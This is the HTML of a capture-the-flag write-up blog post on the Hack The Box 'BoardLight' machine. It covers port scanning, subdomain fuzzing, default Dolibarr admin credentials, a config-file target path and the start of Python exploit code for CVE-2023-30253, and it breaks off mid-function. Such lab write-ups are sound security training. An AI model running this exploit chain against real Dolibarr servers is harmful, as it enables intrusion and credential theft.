@@ -1,0 +1,682 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - BoardLight" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>BoardLight - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/boardlight/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="BoardLight" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/boardlight/" />
+	<meta property="og:description" content="Hack The Box - BoardLight" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/boardlight.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-11-29T15:34:00-08:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="BoardLight" />
+	<meta name="twitter:description" content="Hack The Box - BoardLight" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/boardlight.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/boardlight/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/boardlight/",
+	"url": "https://shengtuo.me/blog/htb/boardlight/",
+	"headline": "BoardLight",
+	"description": "Hack The Box - BoardLight",
+	"datePublished": "2025-11-29T15:34:00-08:00",
+	"dateModified": "2025-11-29T15:34:00-08:00",
+	"image": "https://shengtuo.me/cards/blog/htb/boardlight.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#subdomain-discovery">Subdomain Discovery</a>
+  <a href="#manual-inspection-against-the-newly-found-website">Manual Inspection against the Newly Found Website</a>
+  <a href="#exploit-the-website">Exploit the Website</a><a class="site-toc-sub" href="#shell-as-www-data">Shell as www-data</a>
+  <a href="#shell-as-larissa">Shell as larissa</a>
+  <a href="#shell-as-root">Shell as root</a><a class="site-toc-sub" href="#enumerate-vulnerable-targets-under-larissa">Enumerate Vulnerable Targets under larissa</a><a class="site-toc-sub" href="#exploit-enlightenment">Exploit Enlightenment</a>
+  <a href="#references">References</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>BoardLight</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-11-29">Nov 29, 2025</time> · 1 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>BoardLight (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/boardlight">https://www.hackthebox.com/machines/boardlight</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/BoardLight.ipynb">https://github.com/h1994st/HTB/blob/main/BoardLight.ipynb</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A</span><span class="z-10"> 10.129.231.37</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">from</span><span> common</span><span class="z-3 z-i"> import</span><span> scan_ports</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>TARGET_HOST</span><span class="z-3"> = &quot;</span><span class="z-6">10.129.231.37</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-2">scan_ports</span><span class="z-3">(</span><span class="z-2">TARGET_HOST</span><span class="z-3">)</span></span></code></pre>
+<p>Scanning output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>Nmap is installed.</span></span>
+<span class="giallo-l"><span>Ports:</span></span>
+<span class="giallo-l"><span>{&#39;protocol&#39;: &#39;tcp&#39;, &#39;portid&#39;: &#39;22&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;ssh&#39;, &#39;product&#39;: &#39;OpenSSH&#39;, &#39;version&#39;: &#39;8.2p1 Ubuntu 4ubuntu0.11&#39;, &#39;extrainfo&#39;: &#39;Ubuntu Linux; protocol 2.0&#39;, &#39;ostype&#39;: &#39;Linux&#39;, &#39;method&#39;: &#39;probed&#39;, &#39;conf&#39;: &#39;10&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;protocol&#39;: &#39;tcp&#39;, &#39;portid&#39;: &#39;80&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;http&#39;, &#39;product&#39;: &#39;Apache httpd&#39;, &#39;version&#39;: &#39;2.4.41&#39;, &#39;extrainfo&#39;: &#39;(Ubuntu)&#39;, &#39;method&#39;: &#39;probed&#39;, &#39;conf&#39;: &#39;10&#39;}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>OS Matches:</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;Linux 4.15 - 5.19&#39;, &#39;accuracy&#39;: &#39;100&#39;, &#39;line&#39;: &#39;70533&#39;}</span></span>
+<span class="giallo-l"><span>{&#39;name&#39;: &#39;MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)&#39;, &#39;accuracy&#39;: &#39;100&#39;, &#39;line&#39;: &#39;91791&#39;}</span></span></code></pre><h2 id="subdomain-discovery"><a class="zola-anchor" href="#subdomain-discovery" aria-label="Link to this section">#</a>
+Subdomain Discovery</h2>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span>FFUF_OUTPUT_PATH</span><span class="z-3"> = &quot;</span><span class="z-6">/tmp/ffuf_output.json</span><span class="z-3">&quot;</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3">%%</span><span>script env outfile</span><span class="z-3">=&quot;</span><span class="z-6">$FFUF_OUTPUT_PATH</span><span class="z-3">&quot;</span><span> bash</span></span>
+<span class="giallo-l"><span>ffuf</span><span class="z-3"> -</span><span>u http</span><span class="z-3">://</span><span class="z-10">10.129</span><span class="z-3">.</span><span class="z-9">231</span><span class="z-3">.</span><span class="z-9">37</span><span class="z-3"> -</span><span>H</span><span class="z-3"> &quot;</span><span class="z-6">Host: FUZZ.board.htb</span><span class="z-3">&quot; -</span><span>w</span><span class="z-3"> ~/</span><span>Developer</span><span class="z-3">/</span><span>SecLists</span><span class="z-3">/</span><span>Discovery</span><span class="z-3">/</span><span>DNS</span><span class="z-3">/</span><span>subdomains</span><span class="z-3">-</span><span>top1million</span><span class="z-3">-</span><span class="z-10">20000.</span><span>txt</span><span class="z-3"> -</span><span>ac</span><span class="z-3"> -</span><span>o</span><span class="z-3"> &quot;</span><span class="z-6">$outfile</span><span class="z-3">&quot;</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> json</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">with</span><span class="z-2"> open</span><span class="z-3">(</span><span class="z-2">FFUF_OUTPUT_PATH</span><span class="z-3">, &quot;</span><span class="z-6">r</span><span class="z-3">&quot;)</span><span class="z-3 z-i"> as</span><span> fp</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    ffuf_output</span><span class="z-3"> =</span><span> json</span><span class="z-3">.</span><span class="z-2">load</span><span class="z-3">(</span><span class="z-2">fp</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-2">print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;FFUF output (</span><span class="z-10">{</span><span class="z-2">len</span><span class="z-3">(</span><span class="z-2">ffuf_output</span><span class="z-3">[&#39;</span><span class="z-6">results</span><span class="z-3">&#39;])</span><span class="z-10">}</span><span class="z-6"> in total):&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">for</span><span> entry</span><span class="z-3 z-i"> in</span><span> ffuf_output</span><span class="z-3">[&quot;</span><span class="z-6">results</span><span class="z-3">&quot;]:</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot; - </span><span class="z-10">{</span><span class="z-2">entry</span><span class="z-3">[&#39;</span><span class="z-6">input</span><span class="z-3">&#39;][&#39;</span><span class="z-6">FUZZ</span><span class="z-3">&#39;]</span><span class="z-10">}</span><span class="z-6">: </span><span class="z-10">{</span><span class="z-2">entry</span><span class="z-3">[&#39;</span><span class="z-6">host</span><span class="z-3">&#39;]</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">assert</span><span class="z-2"> len</span><span class="z-3">(</span><span class="z-2">ffuf_output</span><span class="z-3">[&quot;</span><span class="z-6">results</span><span class="z-3">&quot;]) ==</span><span class="z-10"> 1</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>new_host</span><span class="z-3"> =</span><span> ffuf_output</span><span class="z-3">[&quot;</span><span class="z-6">results</span><span class="z-3">&quot;][</span><span class="z-10">0</span><span class="z-3">][&quot;</span><span class="z-6">host</span><span class="z-3">&quot;]</span></span></code></pre>
+<p><code>ffuf</code> output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>FFUF output (1 in total):</span></span>
+<span class="giallo-l"><span>- crm: crm.board.htb</span></span></code></pre><h2 id="manual-inspection-against-the-newly-found-website"><a class="zola-anchor" href="#manual-inspection-against-the-newly-found-website" aria-label="Link to this section">#</a>
+Manual Inspection against the Newly Found Website</h2>
+<p>We can find the following key information:</p>
+<ul>
+<li>Application: <code>Dolibarr</code></li>
+<li>Version: <code>17.0.0</code></li>
+<li>Related CVE: <code>CVE-2023-30253</code></li>
+</ul>
+<h2 id="exploit-the-website"><a class="zola-anchor" href="#exploit-the-website" aria-label="Link to this section">#</a>
+Exploit the Website</h2>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-1 z-i"># Default credentials of Dolibarr</span></span>
+<span class="giallo-l"><span>USERNAME</span><span class="z-3"> = &quot;</span><span class="z-6">admin</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>PASSWORD</span><span class="z-3"> = &quot;</span><span class="z-6">admin</span><span class="z-3">&quot;</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span>SITE_NAME</span><span class="z-3"> = &quot;</span><span class="z-6">EXPLOIT</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>PAGE_NAME</span><span class="z-3"> = &quot;</span><span class="z-6">EXPLOIT</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>CONF_FILE_PATH</span><span class="z-3"> = &quot;</span><span class="z-6">/var/www/html/crm.board.htb/htdocs/conf/conf.php</span><span class="z-3">&quot;</span></span></code></pre><pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">from</span><span> yarl</span><span class="z-3 z-i"> import</span><span> URL</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>BASE_URL</span><span class="z-3">:</span><span> URL</span><span class="z-3"> =</span><span class="z-2"> URL</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;http://</span><span class="z-10">{</span><span class="z-2">new_host</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>LOGIN_URL</span><span class="z-3">:</span><span> URL</span><span class="z-3"> =</span><span> BASE_URL</span><span class="z-3"> / &quot;</span><span class="z-6">index.php</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>ADMIN_URL</span><span class="z-3">:</span><span> URL</span><span class="z-3"> =</span><span> BASE_URL</span><span class="z-3"> / &quot;</span><span class="z-6">admin/index.php</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>WEBSITE_API_URL</span><span class="z-3">:</span><span> URL</span><span class="z-3"> =</span><span> BASE_URL</span><span class="z-3"> / &quot;</span><span class="z-6">website/index.php</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>EXPLOIT_PAGE_URL</span><span class="z-3">:</span><span> URL</span><span class="z-3"> =</span><span> BASE_URL</span><span class="z-3"> / &quot;</span><span class="z-6">public/website/index.php</span><span class="z-3">&quot;</span></span></code></pre><h3 id="shell-as-www-data"><a class="zola-anchor" href="#shell-as-www-data" aria-label="Link to this section">#</a>
+Shell as <code>www-data</code></h3>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> re</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> datetime</span><span class="z-3 z-i"> import</span><span> datetime</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> typing</span><span class="z-3 z-i"> import</span><span> Optional</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">import</span><span> aiohttp</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> bs4</span><span class="z-3 z-i"> import</span><span> BeautifulSoup</span><span class="z-3">,</span><span> Tag</span></span>
+<span class="giallo-l"><span class="z-3 z-i">from</span><span> yarl</span><span class="z-3 z-i"> import</span><span> URL</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>credentials</span><span class="z-3"> = {}</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> get_csrf_token</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span><span class=" z-i"> url</span><span class="z-3">:</span><span> URL</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">str</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> session</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> resp</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Extract CSRF token from the response</span></span>
+<span class="giallo-l"><span>        html_content</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> resp</span><span class="z-3">.</span><span class="z-2">text</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>        soup</span><span class="z-3"> =</span><span class="z-2"> BeautifulSoup</span><span class="z-3">(</span><span class="z-2">html_content</span><span class="z-3">, &quot;</span><span class="z-6">html.parser</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        meta_tag</span><span class="z-3"> =</span><span> soup</span><span class="z-3">.</span><span class="z-2">find</span><span class="z-3">(&quot;</span><span class="z-6">meta</span><span class="z-3">&quot;,</span><span class=" z-i"> attrs</span><span class="z-3">={&quot;</span><span class="z-6">name</span><span class="z-3">&quot;: &quot;</span><span class="z-6">anti-csrf-newtoken</span><span class="z-3">&quot;})</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> meta_tag</span><span class="z-3"> is not None and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">meta_tag</span><span class="z-3">,</span><span class="z-2"> Tag</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span>            csrf_token</span><span class="z-3"> =</span><span> meta_tag</span><span class="z-3">.</span><span class="z-2">get</span><span class="z-3">(&quot;</span><span class="z-6">content</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            if</span><span> csrf_token</span><span class="z-3"> is not None and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">csrf_token</span><span class="z-3">,</span><span class="z-12"> str</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span class="z-3 z-i">                return</span><span> csrf_token</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">        return</span><span class="z-3"> None</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> login</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    username</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    password</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span class="z-12"> bool</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3"> = {</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">token</span><span class="z-3">&quot;:</span><span> csrf_token</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">actionlogin</span><span class="z-3">&quot;: &quot;</span><span class="z-6">login</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">loginfunction</span><span class="z-3">&quot;: &quot;</span><span class="z-6">loginfunction</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">backtopage</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">tz</span><span class="z-3">&quot;: &quot;</span><span class="z-6">-8</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">tz_string</span><span class="z-3">&quot;: &quot;</span><span class="z-6">America/New_York</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dst_observed</span><span class="z-3">&quot;: &quot;</span><span class="z-6">1</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dst_first</span><span class="z-3">&quot;: &quot;</span><span class="z-6">2025-03-9T01:59:00Z</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dst_second</span><span class="z-3">&quot;: &quot;</span><span class="z-6">2025-11-2T01:59:00Z</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">screenwidth</span><span class="z-3">&quot;: &quot;</span><span class="z-6">1032</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">screenheight</span><span class="z-3">&quot;: &quot;</span><span class="z-6">1294</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dol_hide_topmenu</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dol_hide_leftmenu</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dol_optimize_smallscreen</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dol_no_mouse_hover</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">dol_use_jmobile</span><span class="z-3">&quot;: &quot;&quot;,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">username</span><span class="z-3">&quot;:</span><span> username</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">password</span><span class="z-3">&quot;:</span><span> password</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">    }</span></span>
+<span class="giallo-l"><span>    resp</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> session</span><span class="z-3">.</span><span class="z-2">post</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">,</span><span class=" z-i"> data</span><span class="z-3">=</span><span class="z-2">data</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span> resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> ==</span><span class="z-10"> 200</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> create_site</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class=" z-i">    session</span><span class="z-3">:</span><span> aiohttp</span><span class="z-3">.</span><span class="z-9">ClientSession</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    url</span><span class="z-3">:</span><span> URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    csrf_token</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">) -&gt;</span><span class="z-12"> bool</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3"> =</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">FormData</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">token</span><span class="z-3">&quot;,</span><span class="z-2"> csrf_token</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">backtopage</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">dol_openinpopup</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">action</span><span class="z-3">&quot;, &quot;</span><span class="z-6">addsite</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">website</span><span class="z-3">&quot;, &quot;</span><span class="z-6">-1</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_REF</span><span class="z-3">&quot;,</span><span class="z-2"> site_name</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_LANG</span><span class="z-3">&quot;, &quot;</span><span class="z-6">en</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_OTHERLANG</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">WEBSITE_DESCRIPTION</span><span class="z-3">&quot;, &quot;&quot;)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">virtualhost</span><span class="z-3">&quot;,</span><span class="z-7"> f</span><span class="z-6">&quot;http://</span><span class="z-10">{</span><span class="z-2">site_name</span><span class="z-10">}</span><span class="z-6">.local/&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span>    data</span><span class="z-3">.</span><span class="z-2">add_field</span><span class="z-3">(&quot;</span><span class="z-6">addcontainer</span><span class="z-3">&quot;, &quot;</span><span class="z-6">Create</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    resp</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> session</span><span class="z-3">.</span><span class="z-2">post</span><span class="z-3">(</span><span class="z-2">url</span><span class="z-3">,</span><span class=" z-i"> data</span><span class="z-3">=</span><span class="z-2">data</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    return</span><span> resp</span><span class="z-3">.</span><span class="z-9">status</span><span class="z-3"> ==</span><span class="z-10"> 200</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-7">async def</span><span class="z-2"> get_pageid</span><span class="z-3">(</span><span class=" z-i">html_content</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">,</span><span class=" z-i"> page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3">) -&gt;</span><span> Optional</span><span class="z-3">[</span><span class="z-12">int</span><span class="z-3">]:</span></span>
+<span class="giallo-l"><span>    soup</span><span class="z-3"> =</span><span class="z-2"> BeautifulSoup</span><span class="z-3">(</span><span class="z-2">html_content</span><span class="z-3">, &quot;</span><span class="z-6">html.parser</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    page_selector</span><span class="z-3"> =</span><span> soup</span><span class="z-3">.</span><span class="z-2">find</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">select</span><span class="z-3">&quot;,</span><span class=" z-i"> attrs</span><span class="z-3">={&quot;</span><span class="z-6">name</span><span class="z-3">&quot;: &quot;</span><span class="z-6">pageid</span><span class="z-3">&quot;, &quot;</span><span class="z-6">id</span><span class="z-3">&quot;: &quot;</span><span class="z-6">pageid</span><span class="z-3">&quot;}</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> page_selector</span><span class="z-3"> is not None and</span><span class="z-2"> isinstance</span><span class="z-3">(</span><span class="z-2">page_selector</span><span class="z-3">,</span><span class="z-2"> Tag</span><span class="z-3">):</span></span>
+<span class="giallo-l"><span>        pattern</span><span class="z-3"> =</span><span> re</span><span class="z-3">.</span><span class="z-2">compile</span><span class="z-3">(</span><span class="z-7">rf</span><span class="z-6">&quot;\[page \d+\] </span><span class="z-10">{</span><span class="z-2">re</span><span class="z-3">.</span><span class="z-2">escape</span><span class="z-3">(</span><span class="z-2">page_name</span><span class="z-3">)</span><span class="z-10">}</span><span class="z-6"> .*$&quot;</span><span class="z-3">)</span></span>
